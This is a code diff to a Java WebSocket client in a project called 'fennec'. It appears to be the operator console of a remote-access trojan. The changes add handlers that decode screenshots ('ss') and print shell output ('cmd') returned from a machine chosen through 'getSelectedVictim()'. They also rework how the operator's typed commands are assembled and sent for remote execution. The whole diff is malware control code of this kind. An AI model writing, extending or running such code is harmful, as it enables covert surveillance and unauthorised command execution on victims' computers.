@@ -5,17 +5,17 @@ package com.heshanthenura.fennec;
 import java.io.DataInput;
 import java.io.IOException;
 import java.net.URI;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Scanner;
+import java.util.*;
 import java.util.logging.Logger;
+import java.util.stream.Collectors;
 
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
+
+
 
 public class Client extends WebSocketClient {
 
@@ -70,7 +70,12 @@ public class Client extends WebSocketClient {
                         for (String task : taskList) {
                             System.out.println(task);
                         }
-                    } else {
+
+                    } else if(jsonNode.get("command").asText().equals("ss")) {
+                        commands.decodeImg(jsonNode.get("data").asText());
+                    }else if(jsonNode.get("command").asText().equals("cmd")){
+                        System.out.println(jsonNode.get("data").asText().replace("\\n", "\n").replace("\"", ""));
+                    }else {
                         System.out.println(jsonNode.get("data").asText());
                     }
                 }
@@ -157,7 +162,8 @@ public class Client extends WebSocketClient {
                         client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]+" "+splitMsg[3]));
 
                     }else{
-                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]));
+                        String newMessage = Arrays.stream(splitMsg).skip(1).collect(Collectors.joining(" "));
+                        client.send(commands.exec(myID,getSelectedVictim(), newMessage));
                     }
                 }
 
